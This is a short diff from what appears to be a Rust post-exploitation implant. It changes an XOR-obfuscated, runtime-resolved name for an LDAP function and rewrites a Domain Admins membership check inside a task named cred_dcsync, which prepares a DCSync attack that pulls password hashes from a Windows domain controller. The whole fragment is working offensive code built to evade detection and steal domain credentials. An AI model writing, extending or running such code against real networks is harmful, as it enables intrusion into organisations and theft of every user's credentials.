-    let fn_unbind   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
+    let fn_unbind   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
 
     let dc_bytes: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
     let ld = unsafe { fn_init(dc_bytes.as_ptr(), 389) };
@@ -1996,11 +2103,13 @@ fn cred_dcsync(v: &serde_json::Value) -> TaskOutput {
     // has explicit DS-Replication-Get-Changes-All delegation
     let current_user = std::env::var("USERNAME").unwrap_or_default();
     let is_da = {
-        let da_filter = format!(
-            "(&(objectClass=group)(sAMAccountName=Domain Admins)(member=CN={current_user},*))"
-        );
-        ldap_query_attrs(&dc, &base_dn, &da_filter, &["cn"])
-            .map(|r| !r.is_empty())
+        let user_filter = format!("(&(objectClass=user)(sAMAccountName={current_user}))");
+        ldap_query_attrs(&dc, &base_dn, &user_filter, &["memberOf"])
+            .map(|r| r.iter().any(|(_dn, attrs)| {
+                attrs.iter().any(|(k, vals)|
+                    k == "memberOf" && vals.iter().any(|v| v.to_ascii_lowercase().contains("domain admins"))
+                )
+            }))
             .unwrap_or(false)
     };
 
